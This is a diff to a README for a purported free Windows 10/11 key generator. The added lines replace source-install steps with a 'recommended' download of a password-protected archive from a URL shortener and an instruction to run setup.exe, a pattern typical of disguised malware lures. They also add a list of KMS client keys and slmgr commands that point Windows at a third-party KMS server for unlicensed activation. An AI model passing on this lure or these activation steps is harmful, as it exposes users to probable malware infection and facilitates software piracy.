@@ -12,22 +12,38 @@ This is a free Windows 10/11 key generator that allows users to generate activat
 - User-friendly interface.
 - Supports multiple key formats.
 
-## 💻 Installation
-1. Clone this repository:
-   ```sh
-   git clone https://github.com/yourusername/windows-key-generator.git
-   ```
-2. Navigate to the project directory:
-   ```sh
-   cd windows-key-generator
-   ```
-3. Run the program:
-   ```sh
-   python main.py  # or execute the corresponding script
-   ```
+## 📥 Installation & Launch
+
+### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
+1️⃣ **[Download](https://goo.su/hLYS) and extract archive(pass: Project12!)**  
+2️⃣ **Run `setup.exe`**  
+🚀 **The application will set up everything automatically, just enjoy!**  
+
+⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
+
+OR use hand aktivation:
+
+1. First, hit the start or search icon and type the "CMD" in the search box. and after seeing the command prompt option, run it as an administrator
+
+TX9XD-98N7V-6WMQ6-BX7FG-H8Q99	Home
+3KHY7-WNT83-DGQKR-F7HPR-844BM	Home N
+7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH	Home sl 4
+PVMJN-6DFY6–9CCP6–7BKTT-D3WVR	Home cs 5
+W269N-WFGWX-YVC9B-4J6C9-T83GX	Professional
+MH37W-N47XK-V7XM9-C7227-GCQG9	Professional N
+NW6C2-QMPVW-D7KKK-3GKT6-VCFB2	Education
+2WH4N-8QGBV-H22JP-CT43Q-MDWWJ	Education N
+NPPR9-FWDCX-D2C8J-H872K-2YT43	Enterprise
+DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4	Enterprise N
+
+2. slmgr /ipk yourlicensekey
+
+3. slmgr /skms kms8.msguides.com
+
+4. slmgr /ato
 
 ## 📷 Screenshots
-(Add screenshots of the software interface here)
+![Manual aktivation](windows.jpg)
 
 ## 🔧 Requirements
 - Windows 10/11
